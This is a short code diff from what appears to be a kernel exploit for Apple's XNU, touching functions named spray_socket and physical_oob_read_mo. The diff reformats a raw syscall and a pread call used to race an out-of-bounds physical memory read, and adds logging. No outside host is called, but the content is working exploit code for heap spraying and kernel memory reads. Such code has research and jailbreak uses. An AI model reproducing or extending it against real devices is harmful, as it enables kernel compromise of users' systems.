@@ -201,7 +201,17 @@ mach_port_t spray_socket(
 	#pragma clang diagnostic push
 	#pragma clang diagnostic ignored "-Wdeprecated-declarations"
 
-	int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
+	int r = syscall(
+		336,
+		6,
+		getpid(),
+		3,
+		outputSocketPort,
+		socketInfo,
+		0x400
+	);
+
+	LOG("spray_socket: syscall returned %d", r);
 
 	#pragma clang diagnostic pop
 
@@ -348,7 +358,14 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t me
 			FAILURE(0);
 		}
 		if (w == -1) {
-			int r = pread(readFd, buffer, size, 0x3f00 + offset);
+			int r = pread(
+				readFd,
+				buffer,
+				size,
+				0x3f00 + offset
+			);
+
+			LOG("physical_oob_read_mo: pread returned %d", r);
 			uint64_t marker = *(uint64_t *)buffer;
 			if (marker != randomMarker) {
 				readRaceSucceeded = true;
